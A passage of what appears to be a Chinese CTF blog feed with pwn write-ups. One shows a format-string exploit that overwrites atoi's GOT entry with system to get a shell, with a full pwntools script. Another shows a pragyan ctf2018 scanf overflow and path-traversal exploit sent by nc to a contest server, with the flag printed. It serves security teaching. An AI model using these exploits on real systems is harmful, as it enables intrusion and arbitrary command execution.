MEN!\n&quot;);</span><br></pre></td></tr></table></figure><p>看到printf(&amp;buf)之后<br>read(buf)<br>atoi(buf)<br>所以我们的思路就是，<strong>利用格式化字符串漏洞的任意地址读，先leak出puts函数的地址puts_addr<br>到利用格式化字符串漏洞的任意地址写，去将atoi函数在got.plt表中的地址改为system函数的地址，然后通过read去控制buf，传入”/bin/sh”，构造出system(“bin/sh”),获取shell</strong>。<br>关于覆盖got表，不知道为什么的话，参考下面的文章。<br><a href="https://www.jianshu.com/p/0ac63c3744dd" target="_blank" rel="noopener">https://www.jianshu.com/p/0ac63c3744dd</a><br><a href="http://rickgray.me/use-gdb-to-study-got-and-plt" target="_blank" rel="noopener">http://rickgray.me/use-gdb-to-study-got-and-plt</a></p><h3 id="leak出puts函数的地址"><a href="#leak出puts函数的地址" class="headerlink" title="leak出puts函数的地址"></a>leak出puts函数的地址</h3><p>任意地址读：<a href="https://ctf-wiki.github.io/ctf-wiki/pwn/fmtstr/fmtstr_exploit.html" target="_blank" rel="noopener">https://ctf-wiki.github.io/ctf-wiki/pwn/fmtstr/fmtstr_exploit.html</a><br>调试找到puts的地址在栈中的位置。<br><img src="https://ws1.sinaimg.cn/large/006tNc79ly1fnqg75wqhuj31bo0yen3e.jpg" alt=""><br>在gdb中调试（这里我使用了gef插件），可以看出地址在7个参数（仔细分析一下<code>AAAA%7$x</code>，把AAAA换掉就是地址，把%x换成%s就可以打印出内容)</p><h3 id="计算system地址"><a href="#计算system地址" class="headerlink" title="计算system地址"></a>计算system地址</h3><p><code>libc.symbols[&#39;system&#39;] - libc.symbols[&#39;puts&#39;] + u32(puts_addr)</code></p><h3 id="覆盖got表中atoi的内容为system地址"><a href="#覆盖got表中atoi的内容为system地址" class="headerlink" title="覆盖got表中atoi的内容为system地址"></a>覆盖got表中atoi的内容为system地址</h3><h4 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">printf(&quot;abc%nabc\n&quot;, &amp;val);</span><br><span class="line">printf(&quot;val = %d\n&quot;, val);</span><br></pre></td></tr></table></figure><p>输出为<br>abcabc<br>val = 3<br>这就告诉我们，%n可以把其前面输出的字符个数，写入&amp;val指向的地址。<br>如果还不理解的话可以参考：<br><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/fmtstr/fmtstr_exploit.html" target="_blank" rel="noopener">https://ctf-wiki.github.io/ctf-wiki/pwn/fmtstr/fmtstr_exploit.html</a><br><a href="http://www.cnblogs.com/Ox9A82/p/5429099.html" target="_blank" rel="noopener">http://www.cnblogs.com/Ox9A82/p/5429099.html</a></p><p>之前我们已经调试过了”AAAA”就在第7个参数，所以只需构造{addr}{适当的写入值}{<code>%7$n</code>}即可。<br>这里pwntools提供了fmtstr_payload函数来自动生成格式化串。<br>fmtstr_payload(参数偏移,{xxx_got_addr: system_addr})</p><h3 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h3><p><img src="https://ws3.sinaimg.cn/large/006tNc79ly1fnqhotz7ahj30d708mdh6.jpg" alt=""></p><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"># coding:utf-8</span><br><span class="line">from pwn import *</span><br><span class="line">elf = ELF(&apos;pwne&apos;)</span><br><span class="line"># conn=remote(&apos;ip&apos;,port)</span><br><span class="line">libc = ELF(&apos;/lib/i386-linux-gnu/libc.so.6&apos;)</span><br><span class="line"># libc=ELF(&apos;libc.so.6&apos;)</span><br><span class="line">p = process(&apos;./pwne&apos;)</span><br><span class="line">p.recvuntil(&apos;[Y/N]\n&apos;)</span><br><span class="line">p.sendline(&apos;Y&apos;)</span><br><span class="line">p.recvuntil(&apos;NAME:\n\n&apos;)</span><br><span class="line">p.sendline(p32(elf.got[&apos;puts&apos;]) + &apos;%7$s&apos;)</span><br><span class="line">p.recvuntil(&apos;WELCOME \n&apos;)</span><br><span class="line">puts_addr=p.recv()[4:8]</span><br><span class="line"># print u32(put_addr)</span><br><span class="line">system_addr = libc.symbols[&apos;system&apos;] - libc.symbols[&apos;puts&apos;] + u32(puts_addr)</span><br><span class="line">atoi_got_addr = elf.got[&apos;atoi&apos;]</span><br><span class="line">p.sendline(&apos;17&apos;)</span><br><span class="line">p.recvuntil(&apos;[Y/N]\n&apos;)</span><br><span class="line">p.sendline(&apos;Y&apos;)</span><br><span class="line">p.recvuntil(&apos;NAME:\n\n&apos;)</span><br><span class="line">p.sendline(fmtstr_payload(7, &#123;atoi_got_addr: system_addr&#125;))</span><br><span class="line">p.recvuntil(&apos;GET YOUR AGE:\n\n&apos;)</span><br><span class="line">p.sendline(&apos;/bin/sh\x00&apos;)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;格式化字符串漏洞原理&quot;&gt;&lt;a href=&quot;#格式化字符串漏洞原理&quot; class=&quot;headerlink&quot; title=&quot;格式化字符串漏洞原理&quot;&gt;&lt;/a&gt;格式化字符串漏洞原理&lt;/h2&gt;&lt;p&gt;pwn题中，有形如下述代码的形式就是格式化字符串漏洞&lt;br&gt;&lt;figure 
      
    
    </summary>
    
      <category term="CTF" scheme="http://eternalsakura13.com/categories/CTF/"/>
    
      <category term="pwn" scheme="http://eternalsakura13.com/categories/CTF/pwn/"/>
    
      <category term="格式化字符串" scheme="http://eternalsakura13.com/categories/CTF/pwn/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/"/>
    
    
  </entry>
  
  <entry>
    <title>pragyan ctf2018 pwn writeup</title>
    <link href="http://eternalsakura13.com/2018/03/05/pragyan/"/>
    <id>http://eternalsakura13.com/2018/03/05/pragyan/</id>
    <published>2018-03-05T12:09:56.719Z</published>
    <updated>2018-03-08T15:39:34.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Old-school-hack-200pts"><a href="#Old-school-hack-200pts" class="headerlink" title="Old school hack (200pts)"></a>Old school hack (200pts)</h1><h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><h3 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Chris is trying out to be a police officer and the applications have just been sent into the police academy.</span><br><span class="line">He is really eager to find out about his competition. </span><br><span class="line">Help it him back the system and view the other applicant’s applications.</span><br><span class="line"></span><br><span class="line">The service is running at 128.199.224.175:13000</span><br><span class="line"></span><br><span class="line">Hint! Path Traversals are always a classic.</span><br></pre></td></tr></table></figure><h3 id="题目链接："><a href="#题目链接：" class="headerlink" title="题目链接："></a>题目链接：</h3><p><a href="https://github.com/eternalsakura/ctf_pwn/blob/master/pragyan2018/police_academy" target="_blank" rel="noopener">https://github.com/eternalsakura/ctf_pwn/blob/master/pragyan2018/police_academy</a></p><h2 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h2><h3 id="scanf变量覆盖"><a href="#scanf变量覆盖" class="headerlink" title="scanf变量覆盖"></a>scanf变量覆盖</h3><p>程序举例<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> a,b;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"input character a,b\n"</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%s"</span>,&amp;a);<span class="comment">//bug</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%c%c\n"</span>,a,b);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>输出结果<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AA</span><br></pre></td></tr></table></figure></p><p><strong>简单调试</strong><br>编译程序<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc test.c -g -o test</span><br></pre></td></tr></table></figure></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">sakura@ubuntu:~$ gdb test</span><br><span class="line">Loaded 112 commands. Type pwndbg [filter] for a list.</span><br><span class="line">Reading symbols from test...done.</span><br><span class="line">pwndbg&gt; b 5</span><br><span class="line">Breakpoint 1 at 0x4005ff: file test.c, line 5.</span><br><span class="line">pwndbg&gt; r</span><br><span class="line">Starting program: /home/sakura/test </span><br><span class="line">input character a,b</span><br><span class="line">...</span><br><span class="line">pwndbg&gt; n</span><br><span class="line">AAAA</span><br><span class="line">6    printf(&quot;%c%c\n&quot;,a,b);</span><br><span class="line">...</span><br><span class="line">pwndbg&gt; p a</span><br><span class="line">$1 = 65 &apos;A&apos;</span><br><span class="line">pwndbg&gt; p b</span><br><span class="line">$2 = 65 &apos;A&apos;</span><br><span class="line">pwndbg&gt; c</span><br><span class="line">Continuing.</span><br><span class="line">AA</span><br></pre></td></tr></table></figure><p>可以看出函数里本来应该只对a赋值。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">scanf</span>(<span class="string">"%s"</span>,&amp;a)</span><br></pre></td></tr></table></figure></p><p>但是b的值也被覆盖为A了，这里其实就可以栈溢出，但是在本题中只需要覆盖栈内变量即可。</p><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><h3 id="checksec"><a href="#checksec" class="headerlink" title="checksec"></a>checksec</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">sakura@ubuntu:~$ checksec police_academy </span><br><span class="line">[*] &apos;/home/sakura/police_academy&apos;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br><span class="line">sakura@ubuntu:~$</span><br></pre></td></tr></table></figure><p>64位程序,canary,NX保护</p><h3 id="输入密码"><a href="#输入密码" class="headerlink" title="输入密码"></a>输入密码</h3><p>密码被硬编码进程序,即kaiokenx20<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( <span class="built_in">strncmp</span>(&amp;s1, <span class="string">"kaiokenx20"</span>, <span class="number">10u</span>LL) )</span><br></pre></td></tr></table></figure></p><h3 id="栈溢出"><a href="#栈溢出" class="headerlink" title="栈溢出"></a>栈溢出</h3><p><img src="http://onc55v8te.bkt.clouddn.com/2018-03-05-131332.png" alt=""></p><h3 id="文件读取函数"><a href="#文件读取函数" class="headerlink" title="文件读取函数"></a>文件读取函数</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"> __int64 v8; <span class="comment">// [rsp+20h] [rbp-30h]</span></span><br><span class="line"> ...</span><br><span class="line"> v6 = print_record((<span class="keyword">const</span> <span class="keyword">char</span> *)&amp;v8);</span><br><span class="line"></span><br><span class="line"> <span class="keyword">signed</span> __int64 __<span class="function">fastcall <span class="title">print_record</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  FILE *stream; <span class="comment">// [rsp+18h] [rbp-338h]</span></span><br><span class="line">  <span class="keyword">char</span> ptr; <span class="comment">// [rsp+20h] [rbp-330h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v4; <span class="comment">// [rsp+348h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v4 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)<span class="built_in">strlen</span>(a1) != <span class="number">36</span> )         <span class="comment">// 文件名要等于36字节</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0xFFFFFFFF</span>LL;</span><br><span class="line">  stream = fopen(a1, <span class="string">"r"</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !stream )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0xFFFFFFFF</span>LL;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"\nXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX"</span>, <span class="string">"r"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"\nXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX\n"</span>);</span><br><span class="line">  fread(&amp;ptr, <span class="number">0x30C</span>uLL, <span class="number">1u</span>LL, stream);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"%s"</span>, &amp;ptr);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"\n\nXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX"</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"\nXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX"</span>);</span><br><span class="line">  fclose(stream);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个函数的作用就是根据文件名读取文件，这个文件名本来是根据我们的选项(1-7)来决定的，比如如果是7，则v8 = ‘txt.galf’。<br>但是可以看出，如果我们输入的数在1-7之外，那么就不会对v8赋值，如果我们通过前面的scanf直接把v8的值覆盖成我们想要读取的文件名(flag.txt)，那么就可以读取到flag了。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line">__isoc99_scanf(<span class="string">"%d"</span>, &amp;v5);</span><br><span class="line">  <span class="keyword">switch</span> ( v5 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">      v8 = <span class="number">3474298655558951218L</span>L;</span><br><span class="line">      v9 = <span class="number">3847821640488804656L</span>L;</span><br><span class="line">      v10 = <span class="number">7149858464072819505L</span>L;</span><br><span class="line">      v11 = <span class="number">7221017546570621237L</span>L;</span><br><span class="line">      v12 = <span class="number">1952539694</span>;</span><br><span class="line">      v13 = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">      v8 = <span class="number">7147605565415700579L</span>L;</span><br><span class="line">      v9 = <span class="number">3631416849257871156L</span>L;</span><br><span class="line">      v10 = <span class="number">4121973650644951905L</span>L;</span><br><span class="line">      v3 = (<span class="keyword">int</span> *)<span class="number">4049125503535429937L</span>L;</span><br><span class="line">      v11 = <span class="number">4049125503535429937L</span>L;</span><br><span class="line">      v12 = <span class="number">1952539694</span>;</span><br><span class="line">      v13 = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">      v8 = <span class="number">0x3233613163393238</span>LL;</span><br><span class="line">      v9 = <span class="number">3702634411308757558L</span>L;</span><br><span class="line">      v3 = (<span class="keyword">int</span> *)<span class="number">7076898166606619443L</span>L;</span><br><span class="line">      v10 = <span class="number">7076898166606619443L</span>L;</span><br><span class="line">      v11 = <span class="number">7219893850032333154L</span>L;</span><br><span class="line">      v12 = <span class="number">1952539694</span>;</span><br><span class="line">      v13 = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">      v8 = <span class="number">7221577417837786465L</span>L;</span><br><span class="line">      v3 = (<span class="keyword">int</span> *)<span class="number">7363447393777498210L</span>L;</span><br><span class="line">      v9 = <span class="number">7363447393777498210L</span>L;</span><br><span class="line">      v10 = <span class="number">7017788206782754871L</span>L;</span><br><span class="line">      v11 = '06491899';</span><br><span class="line">      v12 = 'tad.';</span><br><span class="line">      v13 = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">      v8 = 'cb7eb354';</span><br><span class="line">      v9 = <span class="number">7147275711155430960L</span>L;</span><br><span class="line">      v10 = <span class="number">7076672766706148656L</span>L;</span><br><span class="line">      v3 = (<span class="keyword">int</span> *)<span class="number">3486685753473249589L</span>L;</span><br><span class="line">      v11 = <span class="number">3486685753473249589L</span>L;</span><br><span class="line">      v12 = <span class="number">1952539694</span>;</span><br><span class="line">      v13 = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">6</span>:</span><br><span class="line">      v8 = <span class="number">0331433146246314630463L</span>L;</span><br><span class="line">      v9 = 'b5d57a29';</span><br><span class="line">      v3 = (int *)'a7e6a65d';</span><br><span class="line">      v10 = 'a7e6a65d';</span><br><span class="line">      v11 = 'c721627f';</span><br><span class="line">      v12 = 'tad.';</span><br><span class="line">      v13 = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">7</span>:</span><br><span class="line">      v8 = 'txt.galf';</span><br><span class="line">      LOBYTE(v9) = <span class="number">0</span>;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"You don't have the required privileges to view the flag, yet."</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">      <span class="keyword">return</span> result;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure></p><h3 id="长度校验"><a href="#长度校验" class="headerlink" title="长度校验"></a>长度校验</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)<span class="built_in">strlen</span>(a1) != <span class="number">36</span> ) </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0xFFFFFFFF</span>LL;</span><br></pre></td></tr></table></figure><p>因为我们提供的v8的文件名要等于36字节，但是flag.txt没有那么长，所以这里，我们可以<strong>用./././..来填充。</strong></p><h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><h3 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h3><p>首先用scanf覆盖是s1的值为密码（kaiokenx20）+padding,覆盖v8的值为././././././././././././././flag.txt，然后读取flag。</p><h3 id="确定填充值"><a href="#确定填充值" class="headerlink" title="确定填充值"></a>确定填充值</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">char s1; // [rsp+10h] [rbp-40h]</span><br><span class="line">__int64 v8; // [rsp+20h] [rbp-30h]</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line"> __isoc99_scanf(&quot;%s&quot;, &amp;s1);</span><br><span class="line"> ...</span><br><span class="line"> ...</span><br><span class="line"> ...</span><br><span class="line">-0000000000000040 s1              db ?</span><br><span class="line">-000000000000003F                 db ? ; undefined</span><br><span class="line">-000000000000003E                 db ? ; undefined</span><br><span class="line">-000000000000003D                 db ? ; undefined</span><br><span class="line">-000000000000003C                 db ? ; undefined</span><br><span class="line">-000000000000003B                 db ? ; undefined</span><br><span class="line">-000000000000003A                 db ? ; undefined</span><br><span class="line">-0000000000000039                 db ? ; undefined</span><br><span class="line">-0000000000000038                 db ? ; undefined</span><br><span class="line">-0000000000000037                 db ? ; undefined</span><br><span class="line">-0000000000000036                 db ? ; undefined</span><br><span class="line">-0000000000000035                 db ? ; undefined</span><br><span class="line">-0000000000000034                 db ? ; undefined</span><br><span class="line">-0000000000000033                 db ? ; undefined</span><br><span class="line">-0000000000000032                 db ? ; undefined</span><br><span class="line">-0000000000000031                 db ? ; undefined</span><br><span class="line">-0000000000000030 var_30          dq ?</span><br><span class="line">-0000000000000028 anonymous_0     dq ?</span><br><span class="line">-0000000000000020 anonymous_1     dq ?</span><br><span class="line">-0000000000000018 anonymous_2     dq ?</span><br><span class="line">-0000000000000010 anonymous_3     dd ?</span><br><span class="line">-000000000000000C anonymous_4     db ?</span><br><span class="line">-000000000000000B                 db ? ; undefined</span><br><span class="line">-000000000000000A                 db ? ; undefined</span><br><span class="line">-0000000000000009                 db ? ; undefined</span><br><span class="line">-0000000000000008 var_8           dq ?</span><br><span class="line">+0000000000000000  s              db 8 dup(?)</span><br><span class="line">+0000000000000008  r              db 8 dup(?)</span><br></pre></td></tr></table></figure><p>s1需填充0x10即16个字节，v8填充36个字节。</p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &apos;print &quot;kaiokenx20\x00&quot;+&quot;\x00&quot;*5+&quot;././././././././././././././flag.txt\x00\n&quot;+&quot;8&quot;&apos;|nc 128.199.224.175 13000</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">sakura@ubuntu:~$ python -c &apos;print &quot;kaiokenx20\x00&quot;+&quot;\x00&quot;*5+&quot;././././././././././././././flag.txt\x00\n&quot;+&quot;8&quot;&apos;|nc 128.199.224.175 13000</span><br><span class="line"></span><br><span class="line">Enter password to authentic yourself : Enter case number: </span><br><span class="line"></span><br><span class="line"> 1) Application_1</span><br><span class="line"> 2) Application_2</span><br><span class="line"> 3) Application_3</span><br><span class="line"> 4) Application_4</span><br><span class="line"> 5) Application_5</span><br><span class="line"> 6) Application_6</span><br><span class="line"> 7) Flag</span><br><span class="line"></span><br><span class="line"> Enter choice :- </span><br><span class="line">XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX</span><br><span class="line">XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX</span><br><span class="line"></span><br><span class="line">The flag is :- pctf&#123;bUff3r-0v3Rfl0wS`4r3.alw4ys-4_cl4SsiC&#125;</span><br><span class="line">r�</span><br><span class="line"></span><br><span class="line">XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX</span><br><span class="line">XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX</span><br></pre></td></tr></table></figure><h1 id="Unbreakable-encryption-350pts"><a href="#Unbreakable-encryption-350pts" class="headerlink" title="Unbreakable encryption (350pts)"></a>Unbreakable encryption (350pts)</h1><h2 id="题目-1"><a href="#题目-1" class="headerlink" title="题目"></a>题目</h2><h3 id="题目描述-1"><a href="#题目描述-1" class="headerlink" title="题目描述"></a>题目描述</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">Your friend, Liara, has encrypted all her life secrets, using the one of the best encryptions available in the world, the AES. She has challenged you that no matter what, you can never read her life secrets.</span><br><span class="line"></span><br><span class="line">The encryption service is running at :- 128.199.224.175:33000</span><br><span class="line">The binary file is named aes_enc.</span><br><span class="line"></span><br><span class="line">Her encrypted life secrets are as follows :-</span><br><span class="line"></span><br><span class="line">0000 - 40 87 68 1a b0 23 73 c4 61 44 b4 c0 21 f1 63 0b @.h..#s.aD..!.c.</span><br><span class="line">0010 - 73 e9 0d 38 e4 bd d8 33 41 64 2c 43 85 d4 54 0e s..8...3Ad,C..T.</span><br><span class="line">0020 - f5 bc 8c 02 db ee 0d e8 d6 29 81 3a 5f cb 63 bd .........).:_.c.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Note: Since some teams were having issues with the buffering of the I/O streams when executing the binary remotely, we have updated the binary 